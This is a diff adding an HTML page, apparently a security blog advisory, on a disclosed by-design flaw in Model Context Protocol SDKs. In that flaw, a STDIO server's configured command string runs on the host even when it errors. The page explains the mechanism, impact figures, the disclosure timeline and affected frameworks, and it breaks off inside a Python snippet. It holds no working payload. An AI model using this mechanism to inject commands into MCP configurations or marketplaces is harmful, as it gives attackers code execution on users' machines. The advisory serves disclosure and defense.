@@ -1,0 +1,1486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Mother of All AI Supply Chains — MCP's By-Design RCE</title>
+<meta name="description" content="A systemic, by-design vulnerability in Anthropic's Model Context Protocol SDKs exposes 150M+ downloads and ~200K servers to arbitrary command execution. An interactive walkthrough of the mechanism, the 10 CVEs, and the six-month disclosure timeline.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,300;0,6..72,400;0,6..72,500;0,6..72,600;0,6..72,700;1,6..72,300;1,6..72,400&family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:           #F5F1EB;
+    --bg-alt:       #EDEAE3;
+    --surface:      #FFFFFF;
+    --surface-tint: #FAF8F5;
+    --border:       #DDD9D0;
+    --border-light: #EAE7E0;
+    --text:         #1A1714;
+    --text-body:    #3D3A35;
+    --text-muted:   #6B6760;
+    --text-subtle:  #9B9892;
+    --accent:       #C85C2D;
+    --accent-light: #E8895D;
+    --accent-bg:    #FDF1EB;
+    --accent-border:#F0C4A8;
+    --green:        #2A7A4B;
+    --green-bg:     #EAF5EF;
+    --green-border: #A8D9BC;
+    --blue:         #2563A8;
+    --blue-bg:      #EAF1FA;
+    --blue-border:  #A8C5E8;
+    --red:          #B83535;
+    --red-bg:       #FAEBEB;
+    --red-border:   #E8AAAA;
+    --purple:       #6B3FA0;
+    --purple-bg:    #F1EAFA;
+    --purple-border:#CDB8E5;
+    --yellow:       #9C7300;
+    --yellow-bg:    #FAF4E2;
+    --yellow-border:#E8D79C;
+    --serif:        'Newsreader', Georgia, serif;
+    --sans:         'Inter', system-ui, sans-serif;
+    --mono:         'JetBrains Mono', 'Courier New', monospace;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text-body);
+    font-family: var(--sans);
+    font-size: 17px;
+    line-height: 1.75;
+    font-weight: 400;
+  }
+
+  /* ─── NAV ─────────────────────────────────────────────── */
+  nav {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 0 48px;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .nav-brand {
+    font-family: var(--sans);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text);
+    letter-spacing: 0.01em;
+    text-decoration: none;
+  }
+  .nav-right {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 13px;
+    color: var(--text-muted);
+  }
+  .nav-tag {
+    background: var(--accent);
+    color: #fff;
+    font-size: 11px;
+    font-weight: 600;
+    padding: 3px 9px;
+    border-radius: 3px;
+    letter-spacing: 0.04em;
+  }
+
+  /* ─── LAYOUT ──────────────────────────────────────────── */
+  .page-wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 0 24px 80px;
+  }
+
+  /* ─── HERO ────────────────────────────────────────────── */
+  .hero {
+    padding: 64px 0 48px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 48px;
+  }
+  .hero-eyebrow {
+    font-family: var(--sans);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--accent);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+  .hero h1 {
+    font-family: var(--serif);
+    font-size: clamp(34px, 5vw, 52px);
+    font-weight: 600;
+    line-height: 1.1;
+    letter-spacing: -0.02em;
+    color: var(--text);
+    margin-bottom: 20px;
+  }
+  .hero-deck {
+    font-size: 18px;
+    line-height: 1.65;
+    color: var(--text-muted);
+    max-width: 640px;
+    font-weight: 300;
+  }
+  .hero-meta {
+    margin-top: 24px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    align-items: center;
+    font-size: 12px;
+    color: var(--text-subtle);
+    font-family: var(--mono);
+  }
+  .hero-meta-sep { color: var(--border); }
+
+  /* ─── BODY TEXT ───────────────────────────────────────── */
+  .prose p {
+    color: var(--text-body);
+    margin-bottom: 20px;
+    font-size: 17px;
+    line-height: 1.78;
+  }
+  .prose p:last-child { margin-bottom: 0; }
+  strong { color: var(--text); font-weight: 600; }
+  em { font-style: italic; color: var(--text-body); }
+  a { color: var(--accent); text-decoration: none; border-bottom: 1px solid var(--accent-border); transition: border-color .15s; }
+  a:hover { border-bottom-color: var(--accent); }
+
+  code.inline {
+    font-family: var(--mono);
+    font-size: 0.86em;
+    background: var(--bg-alt);
+    border: 1px solid var(--border-light);
+    padding: 1px 6px;
+    border-radius: 3px;
+    color: var(--accent);
+  }
+
+  /* ─── SECTION HEADING ─────────────────────────────────── */
+  .section { margin-top: 56px; }
+  .section-label {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .section h2 {
+    font-family: var(--serif);
+    font-size: 28px;
+    font-weight: 600;
+    line-height: 1.2;
+    letter-spacing: -0.01em;
+    color: var(--text);
+    margin-bottom: 24px;
+  }
+  h3 {
+    font-family: var(--serif);
+    font-size: 20px;
+    font-weight: 600;
+    color: var(--text);
+    margin: 32px 0 14px;
+    letter-spacing: -0.01em;
+  }
+
+  /* ─── BANNER ──────────────────────────────────────────── */
+  .banner {
+    background: var(--accent-bg);
+    border: 1px solid var(--accent-border);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 16px 20px;
+    margin-bottom: 40px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+  }
+  .banner-badge {
+    background: var(--accent);
+    color: #fff;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 500;
+    padding: 2px 8px;
+    border-radius: 3px;
+    white-space: nowrap;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .banner p { font-size: 14px; color: var(--text-muted); line-height: 1.6; margin: 0; }
+  .banner a { color: var(--accent); text-decoration: underline; text-underline-offset: 2px; border-bottom: none; }
+
+  /* ─── PLAIN ENGLISH ───────────────────────────────────── */
+  .plain-english {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-top: 3px solid var(--accent);
+    border-radius: 0 0 8px 8px;
+    padding: 28px 32px;
+    margin: 0 0 56px;
+  }
+  .plain-english .pe-label {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+  .pe-list { list-style: none; padding: 0; }
+  .pe-list li {
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border-light);
+    font-size: 16px;
+    color: var(--text-body);
+    line-height: 1.6;
+  }
+  .pe-list li:last-child { border-bottom: none; }
+  .pe-num {
+    width: 26px;
+    height: 26px;
+    background: var(--accent);
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 700;
+    flex-shrink: 0;
+    margin-top: 1px;
+    font-family: var(--mono);
+  }
+
+  /* ─── STATS ROW ───────────────────────────────────────── */
+  .stats-row {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 10px;
+    margin: 28px 0 8px;
+  }
+  .stat-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 18px;
+  }
+  .stat-v {
+    font-family: var(--serif);
+    font-size: 26px;
+    font-weight: 600;
+    color: var(--accent);
+    letter-spacing: -0.02em;
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+  .stat-l {
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    font-weight: 500;
+  }
+
+  /* ─── CARDS GRID ──────────────────────────────────────── */
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 14px;
+    margin: 24px 0;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px 22px;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .card:hover {
+    border-color: var(--accent-border);
+    box-shadow: 0 2px 8px rgba(200,92,45,0.08);
+  }
+  .card-icon { font-size: 20px; margin-bottom: 10px; }
+  .card h4 {
+    font-family: var(--sans);
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 7px;
+  }
+  .card p { font-size: 13px; color: var(--text-muted); line-height: 1.6; margin: 0; }
+  .card.card-red { border-color: var(--red-border); }
+  .card.card-red:hover { border-color: var(--red); box-shadow: 0 2px 8px rgba(184,53,53,0.08); }
+  .card.card-red .card-icon-badge {
+    display: inline-block;
+    background: var(--red-bg);
+    color: var(--red);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    padding: 2px 7px;
+    border-radius: 3px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+  }
+  .card.card-green { border-color: var(--green-border); }
+  .card.card-green:hover { border-color: var(--green); box-shadow: 0 2px 8px rgba(42,122,75,0.08); }
+  .card.card-green .card-icon-badge {
+    display: inline-block;
+    background: var(--green-bg);
+    color: var(--green);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    padding: 2px 7px;
+    border-radius: 3px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+  }
+  .card.card-blue { border-color: var(--blue-border); }
+  .card.card-blue:hover { border-color: var(--blue); box-shadow: 0 2px 8px rgba(37,99,168,0.08); }
+  .card.card-blue .card-icon-badge {
+    display: inline-block;
+    background: var(--blue-bg);
+    color: var(--blue);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    padding: 2px 7px;
+    border-radius: 3px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+  }
+
+  /* ─── CODE BLOCK ──────────────────────────────────────── */
+  .code-block {
+    background: var(--text);
+    border-radius: 7px;
+    overflow: hidden;
+    margin: 20px 0;
+  }
+  .code-block .cb-label {
+    padding: 9px 16px;
+    background: rgba(255,255,255,0.06);
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #888;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .code-block pre {
+    padding: 20px;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    line-height: 1.7;
+    color: #e8e8e8;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .code-block .tok-key  { color: #fdba74; }
+  .code-block .tok-val  { color: #86efac; }
+  .code-block .tok-cmt  { color: #6b7280; font-style: italic; }
+  .code-block .tok-str  { color: #93c5fd; }
+  .code-block .tok-acc  { color: #fde047; }
+
+  /* ─── CALLOUT ─────────────────────────────────────────── */
+  .callout {
+    background: var(--accent-bg);
+    border: 1px solid var(--accent-border);
+    border-left: 3px solid var(--accent);
+    border-radius: 0 6px 6px 0;
+    padding: 18px 22px;
+    margin: 24px 0;
+  }
+  .callout .callout-lbl {
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+  .callout p { font-size: 15px; color: var(--text-muted); margin: 0 0 8px; line-height: 1.7; }
+  .callout p:last-child { margin-bottom: 0; }
+  .callout.callout-blue { background: var(--blue-bg); border-color: var(--blue-border); border-left-color: var(--blue); }
+  .callout.callout-blue .callout-lbl { color: var(--blue); }
+  .callout.callout-green { background: var(--green-bg); border-color: var(--green-border); border-left-color: var(--green); }
+  .callout.callout-green .callout-lbl { color: var(--green); }
+  .callout.callout-yellow { background: var(--yellow-bg); border-color: var(--yellow-border); border-left-color: var(--yellow); }
+  .callout.callout-yellow .callout-lbl { color: var(--yellow); }
+
+  /* ─── PULL QUOTE ──────────────────────────────────────── */
+  .pull-quote {
+    border-left: 3px solid var(--accent);
+    padding: 8px 0 8px 24px;
+    margin: 36px 0;
+    font-family: var(--serif);
+    font-size: 22px;
+    line-height: 1.5;
+    font-style: italic;
+    color: var(--text);
+    font-weight: 400;
+  }
+  .pull-quote cite {
+    display: block;
+    font-family: var(--sans);
+    font-size: 12px;
+    font-style: normal;
+    color: var(--text-muted);
+    letter-spacing: 0.04em;
+    margin-top: 12px;
+    font-weight: 500;
+  }
+
+  /* ─── DETAIL LIST ─────────────────────────────────────── */
+  ul.dl {
+    list-style: none;
+    padding: 0;
+    margin: 0 0 24px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    background: var(--surface);
+  }
+  ul.dl li {
+    padding: 13px 18px 13px 14px;
+    font-size: 15px;
+    color: var(--text-body);
+    border-bottom: 1px solid var(--border-light);
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    line-height: 1.65;
+  }
+  ul.dl li:last-child { border-bottom: none; }
+  ul.dl li::before {
+    content: '→';
+    color: var(--accent);
+    font-size: 14px;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  /* ─── TABLE ───────────────────────────────────────────── */
+  .data-table {
+    overflow-x: auto;
+    margin: 24px 0;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    background: var(--surface);
+  }
+  .data-table table { width: 100%; border-collapse: collapse; font-size: 14px; }
+  .data-table thead th {
+    padding: 11px 16px;
+    text-align: left;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    background: var(--bg-alt);
+    border-bottom: 1px solid var(--border);
+    color: var(--text-muted);
+  }
+  .data-table tbody td {
+    padding: 11px 16px;
+    border-bottom: 1px solid var(--border-light);
+    color: var(--text-body);
+    vertical-align: top;
+    line-height: 1.55;
+  }
+  .data-table tbody tr:last-child td { border-bottom: none; }
+  .data-table tbody tr:hover td { background: var(--surface-tint); }
+  .data-table tbody tr.hidden { display: none; }
+  .td-mono { font-family: var(--mono); font-size: 12px; color: var(--accent); }
+  .data-table td a { border-bottom: none; }
+  .data-table td a:hover { text-decoration: underline; }
+
+  .badge-pill {
+    display: inline-block;
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 600;
+    padding: 2px 9px;
+    border-radius: 11px;
+    letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  .pill-patched { background: var(--green-bg); color: var(--green); border: 1px solid var(--green-border); }
+  .pill-reported { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-border); }
+  .pill-warning { background: var(--yellow-bg); color: var(--yellow); border: 1px solid var(--yellow-border); }
+  .pill-critical { background: var(--red); color: #fff; }
+  .pill-high { background: var(--yellow-bg); color: var(--yellow); border: 1px solid var(--yellow-border); }
+
+  /* ─── INTERACTIVE FLOW DIAGRAM ────────────────────────── */
+  .flow-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px;
+    margin: 24px 0;
+  }
+  .flow-caption {
+    font-family: var(--sans);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    font-weight: 700;
+    margin-bottom: 16px;
+  }
+  .flow-stage-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .flow-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px 10px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.18s;
+    font-family: var(--sans);
+    font-size: 12px;
+    line-height: 1.35;
+    color: var(--text-body);
+    position: relative;
+  }
+  .flow-node::after {
+    content: '›';
+    position: absolute;
+    right: -8px;
+    top: 50%;
+    transform: translateY(-55%);
+    color: var(--border);
+    font-size: 18px;
+    font-weight: 700;
+    z-index: 2;
+  }
+  .flow-node:last-child::after { display: none; }
+  .flow-node:hover, .flow-node.active {
+    border-color: var(--accent);
+    background: var(--accent-bg);
+    color: var(--text);
+    box-shadow: 0 2px 8px rgba(200,92,45,0.10);
+  }
+  .flow-node.active::after { color: var(--accent); }
+  .flow-node-num {
+    display: block;
+    color: var(--accent);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    margin-bottom: 5px;
+    font-family: var(--mono);
+  }
+  .flow-node-title { color: var(--text); font-weight: 600; display: block; font-size: 12px; }
+  .flow-detail {
+    background: var(--surface-tint);
+    border: 1px solid var(--border-light);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 16px 20px;
+    min-height: 112px;
+    font-size: 14px;
+    color: var(--text-body);
+    line-height: 1.65;
+  }
+  .flow-detail-title {
+    font-family: var(--serif);
+    font-size: 16px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 6px;
+    letter-spacing: -0.01em;
+  }
+  .flow-detail-body strong { color: var(--text); }
+  .flow-detail-body code {
+    font-family: var(--mono);
+    font-size: 0.88em;
+    background: var(--bg-alt);
+    border: 1px solid var(--border-light);
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: var(--accent);
+  }
+  .flow-legend {
+    display: flex;
+    gap: 14px;
+    flex-wrap: wrap;
+    margin-top: 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-subtle);
+  }
+  .flow-legend span::before { content: '·'; color: var(--accent); margin-right: 6px; font-weight: 700; }
+
+  /* ─── INTERACTIVE TIMELINE ────────────────────────────── */
+  .tl-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px 20px 20px;
+    margin: 24px 0;
+    overflow-x: auto;
+  }
+  .tl-title-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  .tl-title {
+    font-family: var(--serif);
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text);
+    letter-spacing: -0.01em;
+  }
+  .tl-filters { display: flex; gap: 6px; flex-wrap: wrap; }
+  .tl-filter {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    padding: 5px 11px;
+    border-radius: 14px;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.15s;
+  }
+  .tl-filter:hover { color: var(--text); border-color: var(--text-muted); }
+  .tl-filter.active              { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .tl-filter[data-filter="root"].active      { background: var(--accent);  color: #fff; border-color: var(--accent); }
+  .tl-filter[data-filter="transport"].active { background: var(--yellow);  color: #fff; border-color: var(--yellow); }
+  .tl-filter[data-filter="app"].active       { background: var(--purple);  color: #fff; border-color: var(--purple); }
+
+  .tl-grid {
+    display: grid;
+    grid-template-columns: 110px repeat(6, minmax(120px, 1fr));
+    gap: 0;
+    min-width: 820px;
+    position: relative;
+  }
+  .tl-month-header {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding: 6px 4px 10px;
+    border-bottom: 1px solid var(--border-light);
+    text-align: center;
+    font-weight: 500;
+  }
+  .tl-row-label {
+    font-family: var(--serif);
+    font-size: 15px;
+    font-weight: 600;
+    padding: 24px 10px 24px 0;
+    align-self: center;
+  }
+  .tl-row-label.root      { color: var(--accent); }
+  .tl-row-label.transport { color: var(--yellow); }
+  .tl-row-label.app       { color: var(--purple); }
+  .tl-row-label small {
+    display: block;
+    font-family: var(--sans);
+    font-size: 10px;
+    color: var(--text-subtle);
+    font-weight: 500;
+    margin-top: 3px;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+  }
+
+  .tl-cell {
+    min-height: 92px;
+    padding: 8px 5px;
+    border-left: 1px dashed var(--border-light);
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .tl-event {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 7px 9px;
+    font-size: 11px;
+    line-height: 1.4;
+    color: var(--text-body);
+    transition: all 0.2s;
+  }
+  .tl-event.dimmed { opacity: 0.2; filter: grayscale(0.6); }
+  .tl-event-date {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.03em;
+    font-weight: 600;
+    margin-bottom: 3px;
+    display: block;
+  }
+  .tl-event-body { color: var(--text); font-size: 11px; }
+  .tl-event.root      { border-color: var(--accent-border); background: var(--accent-bg); }
+  .tl-event.root .tl-event-date { color: var(--accent); }
+  .tl-event.transport { border-color: var(--yellow-border); background: var(--yellow-bg); }
+  .tl-event.transport .tl-event-date { color: var(--yellow); }
+  .tl-event.app       { border-color: var(--purple-border); background: var(--purple-bg); }
+  .tl-event.app .tl-event-date { color: var(--purple); }
+  .tl-event.pub       { background: var(--purple); border-color: var(--purple); }
+  .tl-event.pub .tl-event-date, .tl-event.pub .tl-event-body, .tl-event.pub strong { color: #fff; }
+  .tl-event:hover:not(.dimmed) {
+    transform: translateY(-1px);
+    box-shadow: 0 3px 10px rgba(0,0,0,0.08);
+  }
+  .tl-status.ok  { color: var(--green); font-weight: 700; }
+  .tl-status.bad { color: var(--red); font-weight: 700; }
+
+  .tl-hint {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-subtle);
+    margin-top: 14px;
+    text-align: center;
+  }
+
+  /* ─── CVE TABLE FILTERS ───────────────────────────────── */
+  .cve-filters { display: flex; gap: 6px; margin: 8px 0 14px; flex-wrap: wrap; }
+  .cve-filter {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    padding: 5px 11px;
+    border-radius: 14px;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.15s;
+  }
+  .cve-filter:hover { color: var(--text); border-color: var(--text-muted); }
+  .cve-filter.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+
+  /* ─── FOOTER ──────────────────────────────────────────── */
+  footer {
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    padding: 20px 48px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+    font-size: 13px;
+    color: var(--text-muted);
+  }
+  footer a { color: var(--accent); text-decoration: none; border-bottom: none; }
+  footer a:hover { text-decoration: underline; }
+  .footer-refs { display: flex; gap: 18px; flex-wrap: wrap; font-size: 12px; color: var(--text-subtle); }
+
+  @media (max-width: 600px) {
+    nav { padding: 0 20px; }
+    .hero { padding: 40px 0 36px; }
+    .page-wrap { padding: 0 16px 60px; }
+    footer { padding: 16px 20px; }
+    .plain-english { padding: 20px; }
+    .flow-stage-grid { grid-template-columns: 1fr 1fr; }
+    .flow-node::after { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="nav-brand" href="/">asadani.dev</a>
+  <div class="nav-right">
+    <span>Security · Supply Chain</span>
+    <span class="nav-tag">APR 2026</span>
+  </div>
+</nav>
+
+<div class="page-wrap">
+
+  <!-- HERO -->
+  <header class="hero">
+    <div class="hero-eyebrow">MCP Security Advisory — Systemic</div>
+    <h1>The Mother of All AI Supply Chains: MCP's By-Design RCE</h1>
+    <p class="hero-deck">OX Security disclosed a systemic, by-design flaw in Anthropic's Model Context Protocol: passing a configuration string to the STDIO transport is passing a shell command. Anthropic's response was one word — <em>expected</em>.</p>
+    <div class="hero-meta">
+      <span>Published April 21, 2026</span>
+      <span class="hero-meta-sep">/</span>
+      <span>10 CVEs · ~200K vulnerable instances</span>
+      <span class="hero-meta-sep">/</span>
+      <span>Interactive</span>
+    </div>
+  </header>
+
+  <!-- BANNER -->
+  <div class="banner">
+    <span class="banner-badge">ADVISORY</span>
+    <p>Disclosed April 15, 2026 by the <a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/" target="_blank" rel="noopener">OX Security Research team</a>. Affects Anthropic's official MCP SDKs across Python, TypeScript, Java, and Rust — totalling 150M+ downloads. Anthropic declined a protocol-level fix, citing the behavior as "expected."</p>
+  </div>
+
+  <!-- PLAIN ENGLISH -->
+  <div class="plain-english">
+    <div class="pe-label">In Plain English — Four Points</div>
+    <ul class="pe-list">
+      <li>
+        <span class="pe-num">1</span>
+        <div><strong>The protocol's config format is its execution format.</strong> When an MCP client spins up a local STDIO server, the <code class="inline">command</code> string you pass it gets handed straight to the OS. There is no sanitization layer between configuration and <code class="inline">subprocess.spawn</code>.</div>
+      </li>
+      <li>
+        <span class="pe-num">2</span>
+        <div><strong>The error path is the attack path.</strong> If the command fails to produce an MCP server, the SDK throws an error — but the command has already executed with the host process's privileges. "It failed" and "it ran" are the same outcome.</div>
+      </li>
+      <li>
+        <span class="pe-num">3</span>
+        <div><strong>One decision, every language, every downstream tool.</strong> The same pattern exists in Python, TypeScript, Java, and Rust. Every framework building on top of MCP — LangChain, LiteLLM, LangFlow, Cursor, Windsurf — inherits the exposure.</div>
+      </li>
+      <li>
+        <span class="pe-num">4</span>
+        <div><strong>Anthropic won't fix it at the protocol level.</strong> Across six months of coordinated disclosure the response was consistent: "expected behavior." Hardening is left to every downstream implementer — which is why ten separate CVEs now trace back to one line in one SDK.</div>
+      </li>
+    </ul>
+  </div>
+
+  <!-- STATS -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-v">150M+</div>
+      <div class="stat-l">SDK Downloads</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-v">~200K</div>
+      <div class="stat-l">Vulnerable Instances</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-v">10</div>
+      <div class="stat-l">CVEs Assigned</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-v">4</div>
+      <div class="stat-l">Attack Families</div>
+    </div>
+  </div>
+
+  <!-- SECTION 1 -->
+  <div class="section">
+    <div class="section-label">01 · The Disclosure</div>
+    <h2>One Design Decision, Every Language, Every Downstream Library</h2>
+    <div class="prose">
+      <p>On <strong>April 15, 2026</strong>, OX Security Research published what they called <em>"the mother of all AI supply chains"</em> — a class of vulnerability baked into the reference implementation of the <a href="https://modelcontextprotocol.io/" target="_blank" rel="noopener">Model Context Protocol</a> across every supported language. It is not a coding bug. It is the STDIO transport working exactly as specified.</p>
+
+      <p>The mechanics are brutally simple. When an MCP client spins up a local STDIO server, it accepts a <code class="inline">command</code> string and hands it straight to the operating system. If the command successfully spins up an STDIO server, you get a protocol handle. If it fails, you get an error — <strong>and the command still runs.</strong> Sanitization, allowlisting, warning signals: none of it is part of the protocol. The vulnerability is that the configuration format <em>is</em> the execution format.</p>
+    </div>
+
+    <div class="callout callout-yellow">
+      <div class="callout-lbl">Blast radius</div>
+      <p>OX confirmed live command execution on six production platforms — including <strong>LiteLLM</strong>, <strong>LangChain</strong>, and <strong>IBM's LangFlow</strong>. They also seeded a benign payload into <strong>9 of 11</strong> MCP marketplaces to prove malicious distribution trivially works. 150M+ SDK downloads; 7,000+ publicly exposed servers; up to 200K total vulnerable instances.</p>
+    </div>
+
+    <div class="prose">
+      <p>Anthropic was contacted on January 7, 2026. Their response, repeated across multiple rounds: the behavior is <strong>"expected,"</strong> their execution model is a <em>"secure standard,"</em> and hardening is the implementer's job. No protocol-level patch. No deprecation path. They did not object to public disclosure.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 2: INTERACTIVE FLOW -->
+  <div class="section">
+    <div class="section-label">02 · Mechanism</div>
+    <h2>How an Error Return Is Actually a Shell Execution</h2>
+    <div class="prose">
+      <p>The failure mode is counterintuitive: the error path is the attack path. Walk the flow node by node — each click reveals what happens at that step and why error-handling doesn't save you.</p>
+    </div>
+
+    <div class="flow-wrap">
+      <div class="flow-caption">Interactive · StdioServerParameters execution path</div>
+
+      <div class="flow-stage-grid" role="tablist">
+        <button class="flow-node active" data-step="1" role="tab">
+          <span class="flow-node-num">01</span>
+          <span class="flow-node-title">Main App</span>
+        </button>
+        <button class="flow-node" data-step="2" role="tab">
+          <span class="flow-node-num">02</span>
+          <span class="flow-node-title">MCP SDK</span>
+        </button>
+        <button class="flow-node" data-step="3" role="tab">
+          <span class="flow-node-num">03</span>
+          <span class="flow-node-title">OS spawn</span>
+        </button>
+        <button class="flow-node" data-step="4" role="tab">
+          <span class="flow-node-num">04</span>
+          <span class="flow-node-title">Not an MCP?</span>
+        </button>
+        <button class="flow-node" data-step="5" role="tab">
+          <span class="flow-node-num">05</span>
+          <span class="flow-node-title">Still executed</span>
+        </button>
+      </div>
+
+      <div class="flow-detail" id="flow-detail" aria-live="polite">
+        <!-- filled by JS -->
+      </div>
+
+      <div class="flow-legend">
+        <span>Click or hover any node</span>
+        <span>The error is emitted after execution</span>
+        <span>No sanitization at any stage</span>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="cb-label"><span>Python SDK — the pattern being inherited</span><span>mcp.client.stdio</span></div>
+<pre><span class="tok-cmt">from</span> mcp.client.stdio <span class="tok-cmt">import</span> stdio_client, StdioServerParameters
+
+<span class="tok-cmt"># Every field below flows directly to subprocess execution.</span>
+<span class="tok-cmt"># User-controlled input here == remote command execution.</span>
+params = <span class="tok-val">StdioServerParameters</span>(
+    <span class="tok-key">command</span>=<span class="tok-str">"npx"</span>,          <span class="tok-cmt"># ← attacker-controlled in many deployments</span>
